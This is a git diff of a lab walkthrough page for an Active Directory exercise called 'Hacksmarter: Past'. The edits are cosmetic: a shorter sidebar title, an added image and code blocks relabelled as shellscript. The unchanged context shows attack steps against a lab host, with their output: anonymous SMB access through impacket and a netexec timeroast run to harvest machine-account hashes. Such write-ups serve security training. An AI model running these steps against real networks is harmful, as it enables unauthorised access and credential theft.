@@ -1,10 +1,14 @@
 ---
 title: "Hacksmarter: Past"
 description: "From user to Domain admins."
-sidebarTitle: "Hacksmarter: Past"
+sidebarTitle: "HSM: Past"
 tag: "MEDIUM"
 mode: "default"
 ---
+
+<Frame>
+  ![Past](/images/past.png "Past")
+</Frame>
 
 ## Objective
 
@@ -97,7 +101,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 538.31 seconds
 ```
 
-```text
+```shellscript
 impacket-smbclient past.local/'Anonymous':''@10.0.20.184
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -120,7 +124,7 @@ drw-rw-rw-          0  Fri Jan 23 21:04:17 2026 ..
 # get AD_machines.txt
 ```
 
-```text
+```shellscript
 cat AD_machines.txt
 
 Name            DNSHostName
@@ -133,7 +137,7 @@ DEV01
 
 Add it to my `/etc/hosts` file.
 
-```text
+```shellscript
 nxc smb 10.0.20.184 -u '' -p '' -M timeroast
 SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
 SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\:
